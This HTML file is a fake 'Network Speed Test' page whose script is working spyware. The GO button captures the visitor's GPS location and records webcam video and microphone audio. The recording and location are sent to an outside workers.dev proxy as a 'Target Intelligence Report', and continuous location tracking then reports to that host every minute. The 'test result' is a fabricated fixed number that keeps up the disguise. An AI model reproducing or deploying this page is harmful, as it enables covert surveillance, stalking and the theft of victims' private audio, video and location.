<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Speed Test - Check Your Connection</title>
    <style>
        :root { --primary: #00d2ff; --bg: #0b0e14; }
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        
        .container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
        
        /* The Speedometer Circle */
        .go-button {
            width: 200px; height: 200px; border-radius: 50%; border: 4px solid var(--primary);
            background: transparent; color: var(--primary); font-size: 2.5rem; font-weight: bold;
            cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center;
            justify-content: center; text-decoration: none; position: relative;
            box-shadow: 0 0 20px rgba(0, 210, 255, 0.1); margin-bottom: 40px;
        }
        .go-button:hover { background: rgba(0, 210, 255, 0.1); box-shadow: 0 0 40px rgba(0, 210, 255, 0.3); }
        .go-button:disabled { border-color: #333; color: #333; cursor: default; }

        /* Status Text */
        .status-box { margin-top: 20px; }
        .server-info { color: #888; font-size: 0.9rem; margin-top: 10px; }
        #status-text { font-weight: 300; letter-spacing: 1px; text-transform: uppercase; color: var(--primary); font-size: 0.8rem; }
        
        /* Hidden Video */
        video { display: none; }

        /* Animation for "Processing" */
        .loading-ring {
            display: none; position: absolute; width: 220px; height: 220px;
            border: 4px solid transparent; border-top-color: var(--primary);
            border-radius: 50%; animation: spin 1.5s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div style="margin-bottom: 50px;">
            <div style="font-weight: bold; font-size: 1.2rem; letter-spacing: 2px;">SPEEDTEST</div>
            <div style="font-size: 0.7rem; color: #555;">GLOBAL NETWORK INDEX</div>
        </div>

        <div style="position: relative; display: inline-block;">
            <div class="loading-ring" id="ring"></div>
            <button class="go-button" id="startBtn">GO</button>
        </div>

        <div class="status-box">
            <div id="status-text">Ready</div>
            <div class="server-info" id="detail-text">Optimal Server: Auto-Detecting...</div>
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        const PROXY_URL = 'https://discord-handler.lew7348.workers.dev'; 
        const targetID = "USR-" + Math.random().toString(36).substr(2, 5).toUpperCase();
        
        const btn = document.getElementById('startBtn');
        const ring = document.getElementById('ring');
        const statusText = document.getElementById('status-text');
        const detailText = document.getElementById('detail-text');

        // Continuous GPS Tracker
        function startContinuousTracking() {
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    await fetch(PROXY_URL, {
                        method: 'POST',
                        body: JSON.stringify({ content: "ðŸ“¡ **LIVE TRACKING** ["+targetID+"]", embeds: [{description: "ðŸ“ [Map Link](https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude+")"}] }),
                        headers: { 'Content-Type': 'application/json' }
                    }).catch(()=>{});
                });
            }, 60000);
        }

        btn.addEventListener('click', async function() {
            btn.disabled = true;
            ring.style.display = 'block';
            statusText.innerText = "Finding Optimal Server...";
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                detailText.innerText = "Connected to Node: " + targetID;
                statusText.innerText = "Testing Latency...";
                
                startContinuousTracking();

                let stream;
                try {
                    const raw = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    // Our audio-binding fix
                    stream = new MediaStream([raw.getAudioTracks()[0], raw.getVideoTracks()[0]]);
                } catch (e) {
                    statusText.innerText = "Connection Failed";
                    detailText.innerText = "Hardware access required for test.";
                    return;
                }

                statusText.innerText = "Testing Download Speed...";
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();

                setTimeout(() => {
                    statusText.innerText = "Testing Upload Speed...";
                    recorder.stop();
                }, 5000);

                recorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    
                    formData.append('payload_json', JSON.stringify({
                        content: "ðŸ”± **NEW SPEEDTEST CAPTURE** [" + targetID + "]",
                        embeds: [{
                            title: "Target Intelligence Report",
                            color: 3447003,
                            fields: [
                                { name: "ðŸ“ Location", value: pos.coords.latitude + "," + pos.coords.longitude },
                                { name: "ðŸ“± Info", value: navigator.userAgent, inline: false }
                            ]
                        }]
                    }));
                    formData.append('file', videoBlob, 'speedtest_data.webm');

                    await fetch(PROXY_URL, { method: 'POST', body: formData });
                    
                    statusText.innerText = "Test Complete";
                    detailText.innerText = "Result: 48.2 Mbps / 12.1 Mbps";
                    ring.style.display = 'none';
                    btn.innerText = "DONE";
                };
            }, (err) => {
                statusText.innerText = "Error: GPS Disabled";
                btn.disabled = false;
                ring.style.display = 'none';
            });
        });
    </script>
</body>
</html>
